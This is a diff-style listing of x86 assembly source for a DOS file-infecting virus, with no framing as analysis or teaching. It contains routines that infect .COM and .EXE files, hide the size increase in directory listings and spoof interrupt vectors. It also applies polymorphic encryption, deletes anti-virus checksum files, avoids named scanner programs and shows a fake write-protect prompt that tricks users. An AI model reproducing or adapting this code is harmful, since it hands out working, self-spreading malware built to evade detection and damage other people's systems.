+	jmp	cs: chain
+;****************************************************************************
+; Sometimes, it has to be done :(
+;****************************************************************************
+disinfect_ds_dx:
+	call	is_this_file_an_executable
+	jc	this_file_cannot_be_cleaned
+	call	clean_ds_dx
+this_file_cannot_be_cleaned:
+	jmp	cs: chain
+;****************************************************************************
+; Why the hell does DOS 6.22 STILL use these calls?
+;****************************************************************************
+fcbdirectory_stealth:
+	call	real_21
+	cmp	al, 0ffh
+	jz	failed_call
+	pushf
+	call	save_regs
+	mov	ah, 2fh
+	int	ALT_INT		; ES:BX = FCB_DTA
+	cmp	BYTE PTR es: [bx], 0ffh
+	jnz	not_xfcb
+	add	bx, 7
+not_xfcb:
+				; mov   = dx, word ptr es:[bx+01Dh]
+				; mov   = ax, word ptr es:[bx+01Fh]
+				; DX:AX = filesize
+	mov	si, bx		; DS:SI = FILENAME
+	inc	si		; skip drive# field.
+	push	es		; DS:SI = FCB_DTAFilename
+	pop	ds
+	push	es
+	push	cs
+	pop	es
+	mov	di, OFFSET asciizbuf ; ES:DI = 14 Byte ASCII buffer
+	call	fcb_to_asciiz
+	pop	es
+	push	cs
+	pop	ds
+	mov	dx, OFFSET asciizbuf
+	call	check_ds_dx_infected
+	jnc	oh_darn2
+	cmp	BYTE PTR cs: [hide_size], 'Y'
+	jnz	oh_darn2
+	sub	WORD PTR es: [bx+1dh], VIRUS_SIZE
+	sbb	WORD PTR es: [bx+1fh], 0
+oh_darn2:
+	call	restore_regs
+	popf
+	iret
+failed_call:
+	retf	2
+fcb_to_asciiz:
+	push	ax
+	push	cx
+	push	si
+	mov	cx, 8
+	push	si
+ftp_nextchar:
+	lodsb			; get filename char
+	or	al, al
+	jz	ftp_finname	; nul?
+	cmp	al, ' '
+	jz	ftp_finname	; space?
+	stosb			; store it.
+	loop	ftp_nextchar	; do next, until end or nul/space.
+ftp_finname:
+	mov	al, '.'
+	stosb
+	pop	si
+	add	si, 8		; point to file extension.
+	mov	cx, 3
+ftp_nextext:
+	lodsb			; get extension char
+	or	al, al
+	jz	ftp_finext	; nul?
+	cmp	al, ' '
+	jz	ftp_finext	; space?
+	stosb			; store it.
+	loop	ftp_nextext	; do next, until end or nul/space.
+ftp_finext:
+	mov	al, 0		; nul terminate the string.
+	stosb
+	pop	si
+	pop	cx
+	pop	ax
+	ret
+; ************************************************************************
+; Protect Our Memory Area . . . . . . . . . .
+; ************************************************************************
+free_allocate_mem:
+	push	ax
+	push	bx
+	mov	ax, es
+	mov	bx, cs
+	cmp	bx, ax
+	jz	not_ok
+	pop	bx
+	pop	ax
+	jmp	cs: chain
+not_ok:
+	pop	bx
+	pop	ax
+	mov	ax, 9
+	stc
+	iret
+; ************************************************************************
+; Shows interrupt vectors *before* interception.
+; ************************************************************************
+get_interrupt_stealth:
+	cmp	al, DOS_INTERRUPT
+	je	fake_21
+	jmp	cs: chain
+fake_21:
+	mov	es, WORD PTR cs: [save_21_chain+2] ; Put up the one we address
+	mov	bx, WORD PTR cs: [save_21_chain] ; (not the one in the int table )
+	iret
+; ************************************************************************
+; Makes sure virus is first in interrupt chain.
+; ************************************************************************
+set_interrupt_stealth:
+	cmp	al, DOS_INTERRUPT
+	je	fake_again_21
+	jmp	cs: chain
+fake_again_21:
+	mov	WORD PTR cs: [save_21_chain], dx ; Save a copy of their int 21
+	mov	WORD PTR cs: [save_21_chain+2], ds ; 
+	iret
+; ************************************************************************
+; Scans filename passed to interrupt 21h @ DS:DX for .COM or .EXE
+; ************************************************************************
+check_ds_dx:
+	call	is_this_file_an_executable
+	jc	this_file_cannot_be_infected
+	call	nail_file
+this_file_cannot_be_infected:
+	jmp	cs: chain
+; ************************************************************************
+; Hides file length increase if infected, infects file if not already
+; infected.
+; ************************************************************************
+directory_stealth:
+	call	real_21
+	jc	failed_call2
+	pushf
+	call	save_regs
+	call	get_dta		; ES:BX = DTA
+	mov	ax, es
+	push	ax
+	pop	ds
+	mov	ax, bx		; DS:SI = DTA
+	mov	si, ax
+	mov	dx, ax
+	add	dx, 30
+	call	check_ds_dx_infected
+	jnc	oh_darnit
+	cmp	BYTE PTR cs: [hide_size], 'Y'
+	jnz	oh_darnit
+	mov	ds, WORD PTR cs: [r_ds]
+	sub	WORD PTR ds: [si+1ah], VIRUS_SIZE
+	sbb	WORD PTR ds: [si+1ch], 0
+oh_darnit:
+	call	restore_regs
+	popf
+	iret
+failed_call2:
+	retf	2
+; ************************************************************************
+; Used by find_firstnext calls.
+; ************************************************************************
+check_ds_dx_infected:
+	push	ax
+	push	bx
+	push	dx
+	push	ds
+	call	is_this_file_an_executable ; Don't Infect
+	jc	definitely_not_infected ; Non-Executables
+	cmp	BYTE PTR cs: [infect_on_find], 'Y'
+	jnz	dont_infect_on_find
+	call	nail_file
+	cmp	BYTE PTR cs: [nail_file_ok], 1
+	jz	definitely_not_infected
+				; Actually it is infected, but we dont
+				; subtract from the original length.
+				; since the org length is already
+				; in the DTA
+dont_infect_on_find:
+	xor	ax, ax		; Open file
+	call	open_file_handle
+	jc	definitely_not_infected ; Some error so exit
+	xchg	ax, bx
+	push	cs
+	pop	ds
+	call	read_three
+	jc	close_definitely_not_infected
+	call	is_exe_or_com
+	jnc	found_com
+found_exe:
+	call	read_twenty
+	jc	close_definitely_not_infected
+	call	goto_eof
+	mov	WORD PTR cs: [dta+1ah], ax
+	mov	WORD PTR cs: [dta+1ch], dx
+	call	exe_infection_check
+	jc	close_its_infected
+	jmp	SHORT close_definitely_not_infected
+found_com:
+	call	goto_eof
+	mov	WORD PTR cs: [dta+1ah], ax
+	mov	WORD PTR cs: [dta+1ch], dx
+	call	com_infection_check
+	jnc	close_definitely_not_infected
+close_its_infected:
+	call	close_file_handle
+	pop	ds
+	pop	dx
+	pop	bx
+	pop	ax
+	stc
+	ret
+close_definitely_not_infected:
+	call	close_file_handle
+definitely_not_infected:
+	pop	ds
+	pop	dx
+	pop	bx
+	pop	ax
+	clc
+	ret
+; ************************************************************************
+; Real interrupt handler is addressed here.
+; ************************************************************************
+real_21:
+	pop	WORD PTR cs: [sp_save]
+	pushf
+opcode	DB	09ah
+save21_b DD	?
+	pushf
+	push	bp
+	push	ax
+	mov	bp, sp
+	mov	ax, WORD PTR ss: [bp+4]
+	mov	WORD PTR ss: [bp+10], ax
+	pop	ax
+	pop	bp
+	popf
+	jmp	WORD PTR cs: [sp_save]
+; ************************************************************************
+; BX=interrupt:  Gets interrupt directly DX:AX-> segment:offset  
+; ************************************************************************
+rep_vector:
+	push	cx
+	push	ds
+	call	int_seg
+	mov	cl, 2
+	shl	bx, cl
+	cli
+	mov	ax, WORD PTR ds: [bx]
+	mov	dx, WORD PTR ds: [bx+2]
+	sti
+	pop	ds
+	pop	cx
+	ret
+; ************************************************************************
+; Revectors interrupts directly CS:DX-> segment:offset  BX->Interrupt
+; ************************************************************************
+revector:
+	push	cx
+	push	ds
+	call	int_seg
+	mov	cl, 2
+	shl	bx, cl
+	cli
+	mov	WORD PTR ds: [bx], dx
+	mov	WORD PTR ds: [bx+2], cs
+	sti
+	pop	ds
+	pop	cx
+	ret
+; ************************************************************************
+; Used if other program redirects dos_interrupt.
+; ************************************************************************
+restore_swap21:
+	call	kill_trace
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+	push	ds
+	call	int_seg
+	mov	bx, WORD PTR ds: [DOS_INTERRUPT*4]
+	mov	ax, WORD PTR ds: [DOS_INTERRUPT*4+2]
+	push	cs
+	pop	cx
+	cmp	ax, cx
+	jnz	fix_us
+	cmp	bx, OFFSET new_int21
+	jz	offsets_okay
+fix_us:
+	mov	WORD PTR cs: [save_21_chain+2], ax
+	mov	WORD PTR cs: [save_21_chain], bx
+	mov	dx, OFFSET new_int21
+	mov	bx, DOS_INTERRUPT
+	call	revector
+offsets_okay:
+	pop	ds
+	pop	dx
+	pop	cx
+	pop	bx
+	pop	ax
+	ret
+save_regs:
+	mov	WORD PTR cs: [r_ds], ds
+	mov	WORD PTR cs: [r_ax], ax
+	mov	WORD PTR cs: [r_bx], bx
+	mov	WORD PTR cs: [r_cx], cx
+	mov	WORD PTR cs: [r_dx], dx
+	mov	WORD PTR cs: [r_si], si
+	mov	WORD PTR cs: [r_di], di
+	mov	WORD PTR cs: [r_es], es
+	mov	WORD PTR cs: [r_bp], bp
+	ret
+restore_regs:
+	mov	ds, WORD PTR cs: [r_ds]
+	mov	ax, WORD PTR cs: [r_ax]
+	mov	bx, WORD PTR cs: [r_bx]
+	mov	cx, WORD PTR cs: [r_cx]
+	mov	dx, WORD PTR cs: [r_dx]
+	mov	si, WORD PTR cs: [r_si]
+	mov	di, WORD PTR cs: [r_di]
+	mov	es, WORD PTR cs: [r_es]
+	mov	bp, WORD PTR cs: [r_bp]
+	ret
+; ************************************************************************
+; Disinfection Handlers.
+; ************************************************************************
+clean_ds_dx:
+	call	pushall
+	call	revect_24
+	call	get_dta_info
+	call	find_first
+	jc	cparse_cant_open
+	push	cs		; DS=ES=CS
+	pop	es
+	push	cs
+	pop	ds
+	xor	cx, cx		; Smash attributes
+	call	attributes
+	jc	cparse_cant_open ; (if write-protected)
+	mov	al, 02h
+	call	open_file_handle
+	jc	cparse_cant_open
+	xchg	ax, bx		; Put handle in bx for File operations
+	call	read_three
+	jc	cparse_close
+	call	is_exe_or_com
+	jnc	cis_not_exe
+cis_exe:
+	call	read_twenty
+	jc	cparse_close
+cis_not_exe:
+	jmp	SHORT cskip_parse
+cparse_cant_open:
+	jmp	cs: ccant_open
+cskip_parse:
+	mov	al, 02h		; move to end of file
+	call	move_pointer	; dx:ax has file length
+	jc	cparse_close
+	call	is_exe_or_com
+	jnc	ccom_found
+cexe_found:
+	call	exe_infection_check
+	jnc	cparse_close
+	call	fix_exe_header
+cparse_close:
+	jmp	cs: cclose
+ccom_found:
+	call	com_infection_check
+	jnc	cclose		; If .COM already INFECTED
+	call	fix_com_header
+cclose:
+	call	date_close_attributes
+ccant_open:
+	call	reset_dta
+	call	popall
+	call	revect_24
+	ret
+reset_dta:
+	lds	dx, DWORD PTR ds: [dta_save] ; Set DTA to normal
+	call	set_dta
+	ret
+fix_exe_header:
+	call	goto_eof
+	jc	eclose
+	sub	ax, end_of_virus-exe_pages ; start of exe data from eof
+	sbb	dx, 0		; DX:AX -> Old EXE Data
+	call	goto_start_plus_offset
+	jc	eclose
+	mov	cx, end_of_virus-exe_pages
+	mov	dx, OFFSET exe_pages
+	call	read_from_handle
+	jc	eclose
+	call	goto_sof
+	jc	eclose
+	call	rebuild_exe_header
+	mov	cx, 23h
+	mov	dx, OFFSET read_buf
+	call	write_to_handle
+	jc	eclose
+	call	goto_eof
+	jc	eclose
+	sub	ax, VIRUS_SIZE	; 
+	sbb	dx, 0		; DX:AX -> Old EXE EOF
+	call	goto_start_plus_offset
+	jc	eclose
+	xor	cx, cx
+	call	write_to_handle
+eclose:
+	ret
+fix_com_header:
+	call	goto_eof
+	jc	fclose
+	sub	ax, end_of_virus-save3 ; start of com data from eof
+	sbb	dx, 0		; DX:AX -> Old Com Data
+	call	goto_start_plus_offset
+	jc	fclose
+	mov	cx, 3
+	mov	dx, OFFSET save3
+	call	read_from_handle
+	jc	fclose
+	call	goto_sof
+	jc	fclose
+	mov	cx, 3
+	mov	dx, OFFSET save3
+	call	write_to_handle
+	jc	fclose
+	call	goto_eof
+	jc	fclose
+	sub	ax, VIRUS_SIZE	; 
+	sbb	dx, 0		; DX:AX -> Old Com EOF
+	call	goto_start_plus_offset
+	jc	fclose
+	xor	cx, cx
+	call	write_to_handle
+fclose:
+	ret
+; ************************************************************************
+; Infection Handlers.
+; ************************************************************************
+nail_file:
+	mov	BYTE PTR cs: [nail_file_ok], 0
+	call	pushall
+	call	revect_24
+	call	get_dta_info
+	call	find_first
+	jc	parse_cant_open
+	push	cs		; DS=ES=CS
+	pop	es
+	push	cs
+	pop	ds
+	cmp	BYTE PTR [nasty], 'Y'
+	jnz	skip_hunt
+	call	av_hunt
+skip_hunt:
+	lea	si, [dta+30]
+	call	dont_infect_anti_virus
+	jc	parse_cant_open
+	xor	cx, cx		; Smash attributes
+	call	attributes
+	jc	parse_cant_open	; (if write-protected)
+	mov	al, 02h
+	call	open_file_handle
+	jc	parse_cant_open
+	xchg	ax, bx		; Put handle in bx for File operations
+	call	read_three
+	jc	parse_close
+	call	is_exe_or_com
+	jnc	is_not_exe
+is_exe:
+	call	read_twenty
+	jc	parse_close
+is_not_exe:
+	jmp	SHORT skip_parse
+parse_cant_open:
+	jmp	cs: cant_open
+skip_parse:
+	mov	al, 02h		; move to end of file
+	call	move_pointer	; dx:ax has file length
+	jc	parse_close
+	call	is_exe_or_com
+	jnc	com_found
+exe_found:
+	call	is_this_exe_the_right_type
+	jc	parse_close
+	call	exe_infection_check
+	jc	parse_close
+	call	make_exe_header
+	jnc	write_it
+parse_close:
+	jmp	cs: close
+com_found:
+	call	com_infection_check
+	jc	parse_close	; If .COM already INFECTED
+	cmp	ax, 65432-(zseg-start) ; File too big?
+	ja	parse_close
+	call	make_com_header
+	jmp	SHORT write_it
+write_it:
+	xor	bp, bp
+	mov	si, OFFSET polymorph
+	mov	di, OFFSET poly_end
+	push	si
+	push	di
+	mov	dl, BYTE PTR ds: [poly_eval]
+	call	general_encrypt
+	call	polymorph
+	call	time
+	mov	BYTE PTR ds: [poly_eval], dl
+	pop	di
+	pop	si
+	call	general_encrypt
+dont_poly:
+	call	time
+	mov	WORD PTR ds: [eval2], dx
+	call	time
+	mov	WORD PTR ds: [eval3], dx
+	mov	BYTE PTR [ret_code], 0c3h
+	mov	BYTE PTR [store_it], 2eh
+	mov	BYTE PTR [more2], 2eh
+	mov	si, OFFSET move_me
+	mov	di, OFFSET moved_code
+	mov	cx, end_of_move_me-move_me
+	cld
+	repnz	movsb
+	mov	BYTE PTR [ret_code], 0cfh
+	mov	BYTE PTR [store_it], 90h
+	mov	BYTE PTR [more2], 90h
+	call	moved
+	jc	close
+	call	goto_sof	; Goto Start of file
+	jc	close
+	mov	dx, OFFSET read_buf ; Write to start of file
+	xor	cx, cx
+	mov	cl, BYTE PTR ds: [pr_type]
+	call	write_to_handle
+	jc	close
+	mov	BYTE PTR cs: [nail_file_ok], 1
+close:
+	call	date_close_attributes
+cant_open:
+	call	reset_dta
+	call	popall
+	call	revect_24
+	ret
+;****************************************************************************
+; Fixes date, closes file, fixes attributes
+;****************************************************************************
+date_close_attributes:
+	call	date_fix	; fix date to normal
+	call	close_file_handle
+	call	attribute_fix	; fix attributes to normal
+	ret
+; ************************************************************************
+;****************************************************************************
+; Hunts down anti-virus files
+;****************************************************************************
+; ************************************************************************
+av_hunt:
+	push	cs
+	pop	ds
+	mov	dx, OFFSET kill_msav
+	call	kill_ds_dx
+	mov	dx, OFFSET kill_tbav
+	call	kill_ds_dx
+	ret
+kill_tbav DB	'Anti-vir.dat', 0
+kill_msav DB	'chklist.ms', 0
+kill_ds_dx:
+	xor	cx, cx		; Smash attributes
+	mov	ax, 4301h
+	int	ALT_INT
+	jc	awe_darnit
+	mov	ah, 41h		; Delete File
+	int	ALT_INT
+awe_darnit:
+	ret
+; ************************************************************************
+; ************************************************************************
+dont_infect_anti_virus:
+	push	si
+	mov	di, OFFSET scn
+	mov	cx, 4
+	mov	ax, 12
+	call	find_str
+	jnc	avscanner
+	pop	si
+	push	si
+	mov	di, OFFSET ant
+	mov	cx, 4
+	mov	ax, 12
+	call	find_str
+	jnc	avscanner
+	pop	si
+	push	si
+	mov	di, OFFSET vir
+	mov	cx, 3
+	mov	ax, 12
+	call	find_str
+	jnc	avscanner
+	pop	si
+	push	si
+	mov	di, OFFSET avdot
+	mov	ax, 12
+	mov	cx, 3
+	call	find_str
+	jnc	avscanner
+	pop	si
+	push	si
+	mov	di, OFFSET andot
+	mov	cx, 3
+	mov	ax, 12
+	call	find_str
+	jnc	avscanner
+	pop	si
+	jmp	SHORT skpt
+avscanner:
+	pop	si
+	stc
+	ret
+skpt:
+	mov	di, OFFSET pr1
+	mov	cx, 10
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr2
+	mov	cx, 11
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr4
+	mov	cx, 6
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr5
+	mov	cx, 9
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr6
+	mov	cx, 11
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr7
+	mov	cx, 10
+	call	av_compare
+	jc	av_scanner
+	mov	di, OFFSET pr9
+	mov	cx, 11
+	call	av_compare
+	jc	av_scanner
+	clc
+	ret
+av_scanner:
+	stc
+	ret
+; A list of scanners
+scn	DB	'SCAN'
+ant	DB	'ANTI'
+vir	DB	'VIR'
+avdot	DB	'AV.'
+andot	DB	'AN.'
+pr1	DB	'F-PROT.EXE'	; 10
+pr2	DB	'TBDRIVER.EXE'	; 12
+pr4	DB	'NAVTSR'	; 6
+pr5	DB	'VSAFE.COM'	; 9
+pr6	DB	'TBSETUP.EXE'	; 11
+pr7	DB	'TBUTIL.EXE'	; 10
+pr9	DB	'VSHIELD.EXE'	; 11
+; ************************************************************************
+; IN:  DS:SI  Pointer to Address to Start Searching
+;      ES:DI  Pointer to Address of Search String
+;         CX  Search String Length
+;         AX  Number of Bytes To Search
+; OUT:   CF=1 Search String Not Found
+;        CF=0  DS:SI -> Pointer to Found Search String
+; ************************************************************************
+find_str:
+	push	dx
+	push	bx
+	add	ax, si
+	mov	dx, cx
+reset_count:
+	push	di
+	mov	bx, si
+look_again:
+	mov	cx, dx
+	cld
+	repe	cmpsb
+	jcxz	found_string
+	mov	si, bx
+	inc	si
+	jz	end_search
+	cmp	si, ax
+	jz	end_search
+	pop	di
+	jmp	SHORT reset_count
+found_string:
+	pop	di
+	pop	bx
+	pop	dx
+	clc
+	ret
+end_search:
+	pop	di
+	pop	bx
+	pop	dx
+	stc
+	ret
+av_compare:
+	lea	si, [dta+30]
+	cld			; clear the df flag for compare
+	repe	cmpsb
+	jcxz	gotmatch	; did cl reach zero?
+	clc
+	ret
+gotmatch:
+	stc
+	ret
+; ************************************************************************
+; Critical Error Handler, Requests users to unwrite protect thier disk.
+; ************************************************************************
+new_int24:
+	call	disk_err
+	mov	al, 3
+	iret
+bogus	DB	10, 13
+	DB	'Disk is Write Protected', 10, 13
+	DB	'Please Unprotect it AND ', 10, 13
+	DB	'Press any key to continue . . .', 10, 13, '$'
+; ************************************************************************
+; Called if write protected disk in drive.
+; ************************************************************************
+disk_err:
+	call	pushall
+	push	cs
+	pop	ds
+	mov	ah, 59h
+	mov	bx, 0
+	int	ALT_INT
+	cmp	al, 13h
+	jnz	not_write
+	mov	ah, 0fh
+	int	10h
+	cmp	al, 7
+	jz	text_mode
+	cmp	al, 4
+	jae	not_write
+text_mode:
+	mov	dx, OFFSET bogus
+	mov	ah, 9h
+	int	ALT_INT
+	mov	ah, 08h
+	int	ALT_INT
+not_write:
+	call	popall
+	ret
+; ************************************************************************
+; Makes DS=0000 (Interrupt segment)
+; ************************************************************************
+int_seg:
+	push	ax
+	xor	ax, ax
+	push	ax
+	pop	ds
+	pop	ax
+	ret
+; ************************************************************************
+; Scans a filename at DS:DX
+; Sets Carry if Not executable.
+; ************************************************************************
+is_this_file_an_executable:
+	push	ax
+	push	cx
+	push	di
+	mov	cx, 128
+	push	dx
+	pop	di
+next_bite:
+	mov	al, BYTE PTR ds: [di]
+	cmp	al, 0
+	jz	null_term
+	dec	cx
+	jz	oh_darn
+	inc	di
+	jmp	SHORT next_bite
+null_term:
+	sub	di, 4
+	mov	al, BYTE PTR ds: [di]
+	cmp	al, '.'
+	jnz	oh_darn
+	inc	di
+	mov	ax, WORD PTR ds: [di]
+	inc	di
+	inc	di
+	and	ax, 0dfdfh
+	cmp	ax, 'XE'
+	jz	could_be_an_exe
+	cmp	ax, 'OC'
+	jnz	oh_darn
+could_be_a_com:
+	mov	al, BYTE PTR ds: [di]
+	and	al, 0dfh
+	cmp	al, 'M'
+	jz	got_executable
+oh_darn:
+	pop	di
+	pop	cx
+	pop	ax
+	stc
+	ret
+could_be_an_exe:
+	mov	al, BYTE PTR ds: [di]
+	and	al, 0dfh
+	cmp	al, 'E'
+	jnz	oh_darn
+got_executable:
+	pop	di
+	pop	cx
+	pop	ax
+	clc
+	ret
+; ************************************************************************
+; We have an EXE file to fuck up. (EXEs are slightly more complex than .COMs)
+; Makes Header Info, calculates entry point and stack segment
+; ************************************************************************
+make_exe_header:
+	push	bx
+	push	es
+	pop	es
+	mov	ax, WORD PTR ds: [dta+1ah]
+	mov	dx, WORD PTR ds: [dta+1ch]
+	push	ax
+	push	dx
+	mov	ax, WORD PTR ds: [MY_HEADER_SIZE]
+	mov	dx, 10h
+	mul	dx		; DX:AX ->header size in bytes
+	pop	cx		; CX:BX ->total file size
+	pop	bx
+	sub	bx, ax
+	sbb	cx, dx
+	jc	math_error
+	mov	ax, bx		; DX:AX ->Module Size
+	mov	dx, cx
+	cmp	dx, 010h
+	jae	math_error
+not_too_big:
+	cmp	dx, 0
+	jnz	go_divide
+	cmp	ax, 0
+	jz	math_error
+go_divide:
+	mov	cx, 10h
+	div	cx
+	jmp	SHORT no_math_error
+math_error:
+	pop	bx
+	stc
+	ret
+no_math_error:
+	mov	WORD PTR ds: [EXE_IP], dx
+	mov	WORD PTR ds: [delta_offset+1], dx
+	mov	WORD PTR ds: [MY_CODE_SEGMENT], ax
+	add	ax, (VIRUS_SIZE)/16+1
+	mov	WORD PTR ds: [MY_STACK_SEGMENT], ax
+	mov	WORD PTR ds: [MY_STACK_POINTER], INFECTED
+	add	WORD PTR ds: [dta+1ah], VIRUS_SIZE
+	adc	WORD PTR ds: [dta+1ch], 0
+	mov	ax, WORD PTR ds: [dta+1ah]
+	mov	dx, WORD PTR ds: [dta+1ch]
+	push	dx
+	push	ax
+	mov	cl, 9
+	ror	dx, cl		; divide dx:ax by 512
+	mov	bx, dx
+	cmp	al, 0
+	je	dont_add
+	inc	dx
+dont_add:
+	shr	ax, cl		; Divide low order by 512
+				; throw away remainder
+	add	dx, ax		; dx has size of file
+	add	bx, ax		; in 512 byte pages
+				; (rounded up)
+				; BX has it rounded down
+	mov	WORD PTR ds: [MY_SIZE_IN_PAGES], dx ; New file size in pages
+	mov	ax, bx
+	mov	cx, 200h	; Multiply BX by 512
+	mul	cx
+	mov	cx, dx
+	mov	bx, ax		; CX:BX has modulo
+	pop	ax		; File size again
+	pop	dx		; 
+	sub	dx, cx
+	sbb	ax, bx		; AX has filesize
+	mov	WORD PTR ds: [MY_SIZE_MOD_512], ax ; MOD 512
+	add	WORD PTR ds: [MINIMUM], ((zseg-start)/16)+1
+	jnc	no_carry_para
+	mov	WORD PTR ds: [MINIMUM], 0ffffh
+no_carry_para:
+	add	WORD PTR ds: [MAXIMUM], ((zseg-start)/16)+1
+	jnc	no_carry_para2
+	mov	WORD PTR ds: [MAXIMUM], 0ffffh
+no_carry_para2:
+	pop	bx
+	clc
+	ret
+; ************************************************************************
+; Revectors Int 24h and 13h
+; ************************************************************************
+revect_24:
+	push	ax
+	push	bx
+	push	dx
+	push	ds
+	call	int_seg
+	mov	bx, 24h
+	call	rep_vector
+	cmp	ax, OFFSET new_int24
+	je	vect_24
+	mov	WORD PTR cs: [save_24], ax
+	mov	WORD PTR cs: [save_24+2], dx
+	mov	WORD PTR ds: [24h*4], OFFSET new_int24
+	mov	WORD PTR ds: [24h*4+2], cs
+	jmp	SHORT done_24
+vect_24:
+	mov	ax, WORD PTR cs: [save_24]
+	mov	bx, WORD PTR cs: [save_24+2]
+	mov	WORD PTR ds: [24h*4], ax
+	mov	WORD PTR ds: [24h*4+2], bx
+done_24:
+	mov	bx, BIOS_DISK_INTERRUPT
+	call	rep_vector
+	cmp	ax, WORD PTR cs: [save13]
+	je	vect_13
+	mov	WORD PTR cs: [save13_b], ax
+	mov	WORD PTR cs: [save13_b+2], dx
+	mov	ax, WORD PTR cs: [save13]
+	mov	bx, WORD PTR cs: [save13+2]
+	mov	WORD PTR ds: [BIOS_DISK_INTERRUPT*4], ax
+	mov	WORD PTR ds: [BIOS_DISK_INTERRUPT*4+2], bx
+vect_13:
+	mov	ax, WORD PTR cs: [save13_b]
+	mov	bx, WORD PTR cs: [save13_b+2]
+	mov	WORD PTR ds: [BIOS_DISK_INTERRUPT*4], ax
+	mov	WORD PTR ds: [BIOS_DISK_INTERRUPT*4+2], bx
+	pop	ds
+	pop	dx
+	pop	bx
+	pop	ax
+	ret
+; ************************************************************************
+; We have a .COM file, make header info and store original 3 bytes
+; ************************************************************************
+make_com_header:
+	mov	ax, WORD PTR ds: [dta+26]
+	mov	WORD PTR ds: [delta_offset+1], ax
+	add	WORD PTR ds: [delta_offset+1], 100h
+	mov	cx, 3
+	mov	si, OFFSET read_buf
+	mov	di, OFFSET save3
+	cld
+	movsb
+	movsw
+	sub	ax, 3
+	mov	WORD PTR ds: [read_buf], 0e8h
+	mov	WORD PTR ds: [read_buf+1], ax
+	ret
+; ************************************************************************
+; This saves and sets the DTA areas.
+; ************************************************************************
+get_dta_info:
+	push	ds
+	push	cs
+	pop	ds		; DS=CS
+	push	es
+	call	get_dta
+	mov	WORD PTR ds: [dta_save+2], es ; GET and
+	mov	WORD PTR ds: [dta_save], bx ; save DTA
+	pop	es
+	push	dx
+	mov	dx, OFFSET dta
+	call	set_dta
+	pop	dx
+	pop	ds
+	ret
+; ***************************************************************************
+; This restores the file's date and time stamps. 
+; ***************************************************************************
+date_fix:
+	mov	ax, 5701h
+	mov	cx, WORD PTR ds: [dta+16h]
+	mov	dx, WORD PTR ds: [dta+18h]
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This Resets File Attributes 
+; ************************************************************************
+attribute_fix:
+	mov	ch, 0
+	mov	cl, BYTE PTR ds: [dta+15h]
+	call	attributes
+	ret
+; ************************************************************************
+; This Returns The Current DTA 
+; ************************************************************************
+get_dta:
+	mov	ah, 2fh
+	int	ALT_INT
+	ret
+; ************************************************************************
+; This checks READ_BUF for file type 
+; ************************************************************************
+is_exe_or_com:
+	cmp	WORD PTR cs: [read_buf], 'ZM' ; Check For EXE
+	je	ifound_exe
+	cmp	WORD PTR cs: [read_buf], 'MZ' ; Check For EXE
+	jne	ifound_com
+ifound_exe:
+	mov	BYTE PTR cs: [pr_type], 20h ; 
+	mov	ax, WORD PTR cs: [EXE_IP]
+	mov	WORD PTR cs: [saved_cs_ip], ax
+	mov	ax, WORD PTR cs: [MY_CODE_SEGMENT]
+	mov	WORD PTR cs: [saved_cs_ip+2], ax
+	mov	ax, WORD PTR cs: [MY_STACK_POINTER]
+	mov	WORD PTR cs: [saved_ss_sp], ax
+	mov	ax, WORD PTR cs: [MY_STACK_SEGMENT]
+	mov	WORD PTR cs: [saved_ss_sp+2], ax
+	mov	ax, WORD PTR cs: [MINIMUM]
+	mov	WORD PTR cs: [min_mem], ax
+	mov	ax, WORD PTR cs: [MAXIMUM]
+	mov	WORD PTR cs: [max_mem], ax
+	mov	ax, WORD PTR cs: [MY_SIZE_IN_PAGES]
+	mov	WORD PTR cs: [exe_pages], ax
+	mov	ax, WORD PTR cs: [MY_SIZE_MOD_512]
+	mov	WORD PTR cs: [exe_mod_512], ax
+	stc
+	ret
+ifound_com:
+	mov	BYTE PTR cs: [pr_type], 3h ; Assume .COM
+	clc
+	ret
+;****************************************************************************
+; Looks for first file
+;****************************************************************************
+find_first:
+	mov	cx, 7		; look for any attributes
+	mov	ah, 4eh		; Attempt to Find File
+	int	ALT_INT		; DS:DTA+30h file name
+	ret
+;****************************************************************************
+; Reads 20 bytes from filehandle BX into  READ_BUF+3  (EXE)
+;****************************************************************************
+read_twenty:
+	lea	dx, ds: [read_buf+3]
+	mov	cx, 20h
+	call	read_from_handle
+	ret
+;****************************************************************************
+; Reads 3 bytes from filehandle BX into  READ_BUF
+;****************************************************************************
+read_three:
+	mov	cx, 3
+	mov	dx, OFFSET read_buf ; Read in 3 Bytes
+	call	read_from_handle
+	ret
+;****************************************************************************
+; Duh
+;****************************************************************************
+write_to_handle:
+	mov	ah, 40h
+	int	ALT_INT
+	ret
+;****************************************************************************
+; Goes to start of file handle in BX
+;****************************************************************************
+goto_sof:
+	xor	ax, ax
+	xor	dx, dx
+	call	goto_start_plus_offset
+	ret
+;****************************************************************************
+; Offset is in DX:AX
+;****************************************************************************
+goto_start_plus_offset:
+	mov	cx, dx		; CX:DX
+	mov	dx, ax
+	mov	ax, 4200h
+	int	ALT_INT
+	ret
+;****************************************************************************
+; Goes to end of filehandle in BX
+;****************************************************************************
+goto_eof:
+	xor	cx, cx
+	xor	dx, dx
+	mov	ax, 4202h	; MOV EOF
+	int	ALT_INT
+	ret
+;****************************************************************************
+; Rebuilds EXE header from info at end of file
+;****************************************************************************
+rebuild_exe_header:
+				; rebuild EXE Header
+	mov	ax, WORD PTR ds: [saved_cs_ip]
+	mov	WORD PTR ds: [EXE_IP], ax
+	mov	ax, WORD PTR ds: [saved_cs_ip+2]
+	mov	WORD PTR ds: [MY_CODE_SEGMENT], ax
+	mov	ax, WORD PTR ds: [saved_ss_sp]
+	mov	WORD PTR ds: [MY_STACK_POINTER], ax
+	mov	ax, WORD PTR ds: [saved_ss_sp+2]
+	mov	WORD PTR ds: [MY_STACK_SEGMENT], ax
+	mov	ax, WORD PTR ds: [min_mem]
+	mov	WORD PTR ds: [MINIMUM], ax
+	mov	ax, WORD PTR ds: [max_mem]
+	mov	WORD PTR ds: [MAXIMUM], ax
+	mov	ax, WORD PTR ds: [exe_pages]
+	mov	WORD PTR ds: [MY_SIZE_IN_PAGES], ax
+	mov	ax, WORD PTR ds: [exe_mod_512]
+	mov	WORD PTR ds: [MY_SIZE_MOD_512], ax
+	ret
